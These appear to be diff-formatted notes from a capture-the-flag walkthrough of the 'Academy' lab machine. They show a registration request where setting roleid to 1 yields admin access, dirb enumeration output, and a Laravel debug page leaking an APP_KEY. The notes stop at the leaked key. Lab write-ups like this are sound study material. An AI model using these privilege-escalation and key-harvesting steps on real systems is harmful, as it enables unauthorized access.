@@ -1,0 +1,92 @@
+
+
+
+On register, we are able to set our roleid
+
+POST /register.php HTTP/1.1
+Host: academy.htb
+Content-Length: 44
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://academy.htb
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://academy.htb/register.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=dr4pesorlobfqjhjam5vr3mdsl
+Connection: keep-alive
+
+uid=tony&password=soprano&confirm=soprano&roleid=0
+
+we change to 1 to allow admin access.
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://academy.htb             
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Oct 13 10:58:02 2025
+URL_BASE: http://academy.htb/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://academy.htb/ ----
++ http://academy.htb/admin.php (CODE:200|SIZE:2633)
+
+
+
+we login and see
+Fix issue with "dev-staging-01.academy.htb"
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '10.10.10.215 dev-staging-01.academy.htb' |tee -a /etc/hosts
+
+
+we see
+"UnexpectedValueException
+The stream or file "/var/www/html/htb-academy-dev-01/storage/logs/laravel.log" could not be opened in append mode: failed to open stream: Permission denied"
+
+"Laravel displays this type of error when debug mode is enabled. This happens when APP_DEBUG
+is set to TRUE in the .env . We are unsure of the exact Laravel version, but we can still try to take
+an educated guess. Laravel uses Ignition to display richly formatted debug mode errors. The
+current version of Laravel displays errors that look like this (this example is from the Ignition
+readme.md)."
+
+"The debug UI on the
+machine is different to this, so we can assume that it's running an older version, possibly around
+Laravel 5x. Laravel in debug mode can also return sensitive information such as the API Key or
+MySQL credentials, which can be found on scrolling down to the "Environment Variables" section."
+
+Environment Variables
+APP_NAME	
+"Laravel"
+APP_ENV	
+"local"
+APP_KEY	
+"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
